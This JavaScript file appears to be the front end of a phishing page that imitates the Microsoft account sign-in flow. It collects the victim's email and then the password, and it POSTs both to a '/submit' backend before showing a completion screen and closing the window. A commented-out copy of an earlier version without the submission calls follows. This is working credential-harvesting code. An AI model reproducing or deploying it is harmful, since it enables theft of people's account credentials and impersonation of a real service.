document.addEventListener('DOMContentLoaded', () => {
    console.log("App.js loaded successfully");

    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";
    let storedEmail = "";

    let unameVal = pwdVal = false;

    /////next button
    const nxt = document.getElementById('btn_next');
    if (nxt) {
        console.log("Next button found");
        nxt.addEventListener('click', async () => {
            console.log("Next button clicked");
            validate();
            if (unameVal) {
                storedEmail = unameInp.value.trim();
                console.log("Sending email:", storedEmail);

                try {
                    // Send email to backend
                    const response = await fetch('/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'email',
                            email: storedEmail
                        })
                    });
                    const data = await response.json();
                    console.log("Server response:", data);
                } catch (error) {
                    console.error("Fetch error:", error);
                    alert("Error connecting to server. Make sure server is running on port 3000");
                }

                document.getElementById("section_uname").classList.add('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = unameInp.value;
                })
                view = "pwd";
            }
        })
    } else {
        console.error("Next button not found!");
    }

    //////sign in button
    const sig = document.getElementById('btn_sig');
    if (sig) {
        console.log("Sign in button found");
        sig.addEventListener('click', async () => {
            console.log("Sign in button clicked");
            validate();
            if (pwdVal) {
                console.log("Sending password for:", storedEmail);

                try {
                    const response = await fetch('/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'password',
                            email: storedEmail,
                            password: pwdInp.value.trim()
                        })
                    });
                    const data = await response.json();
                    console.log("Server response:", data);
                } catch (error) {
                    console.error("Fetch error:", error);
                    alert("Error connecting to server. Make sure server is running on port 3000");
                }

                document.getElementById("section_pwd").classList.add('d-none');
                document.getElementById('section_final').classList.remove('d-none');
                view = "final";
            }
        })
    } else {
        console.error("Sign in button not found!");
    }

    function validate() {
        console.log("Validating, view:", view);
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
        }
        return false;
    }

    //back button
    const backBtn = document.querySelector('.back');
    if (backBtn) {
        backBtn.addEventListener('click', () => {
            console.log("Back button clicked");
            view = "uname";
            document.getElementById("section_pwd").classList.add('d-none');
            document.getElementById('section_uname').classList.remove('d-none');
        })
    }

    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            console.log("Final button clicked");
            window.open(location, '_self').close();
        })
    })
});


// document.addEventListener('DOMContentLoaded', () => {
//     const unReq = "Enter a valid email address, phone number, or Skype name."
//     const pwdReq = "Please enter the password for your Microsoft account."
//     const unameInp = document.getElementById('inp_uname');
//     const pwdInp = document.getElementById('inp_pwd');
//     let view = "uname";

//     let unameVal = pwdVal = false;
//     /////next button
//     const nxt = document.getElementById('btn_next');

//     nxt.addEventListener('click', () => {
//         //validate the form
//         validate();
//         if (unameVal) {
//             document.getElementById("section_uname").classList.toggle('d-none');
//             document.getElementById('section_pwd').classList.remove('d-none');
//             document.querySelectorAll('#user_identity').forEach((e) => {
//                 e.innerText = unameInp.value;
//             })
//             view = "pwd";
//         }
//     })

//     //////sign in button

//     const sig = document.getElementById('btn_sig');

//     sig.addEventListener('click', () => {
//         //validate the form
//         validate();
//         if (pwdVal) {
//             document.getElementById("section_pwd").classList.toggle('d-none');
//             document.getElementById('section_final').classList.remove('d-none');
//             view = "final";
//         }
//     })

//     function validate() {
//         function unameValAction(type) {
//             if (!type) {
//                 document.getElementById('error_uname').innerText = unReq;
//                 unameInp.classList.add('error-inp');
//                 unameVal = false;
//             } else {
//                 document.getElementById('error_uname').innerText = "";
//                 unameInp.classList.remove('error-inp')
//                 unameVal = true;
//             }

//         }
//         function pwdValAction(type) {
//             if (!type) {
//                 document.getElementById('error_pwd').innerText = pwdReq;
//                 pwdInp.classList.add('error-inp')
//                 pwdVal = false;
//             } else {
//                 document.getElementById('error_pwd').innerText = "";
//                 pwdInp.classList.remove('error-inp')
//                 pwdVal = true;
//             }

//         }
//         if (view === "uname") {
//             if (unameInp.value.trim() === "") {
//                 unameValAction(false);
//             } else {
//                 unameValAction(true);
//             }
//             unameInp.addEventListener('change', function () {
//                 if (this.value.trim() === "") {
//                     unameValAction(false);
//                 } else {
//                     unameValAction(true);
//                 }
//             })
//         } else if (view === "pwd") {
//             if (pwdInp.value.trim() === "") {
//                 pwdValAction(false);
//             } else {
//                 pwdValAction(true);
//             }
//             pwdInp.addEventListener('change', function () {
//                 if (this.value.trim() === "") {
//                     pwdValAction(false);
//                 } else {
//                     pwdValAction(true);
//                 }
//             })
//         }
//         return false;
//     }

//     //back button
//     document.querySelector('.back').addEventListener('click', () => {
//         view = "uname";
//         document.getElementById("section_pwd").classList.toggle('d-none');
//         document.getElementById('section_uname').classList.remove('d-none');
//     })

//     //final buttons
//     document.querySelectorAll('#btn_final').forEach((b) => {
//         b.addEventListener('click', () => {
//             //close the window
//             window.open(location, '_self').close();
//         })
//     })
// })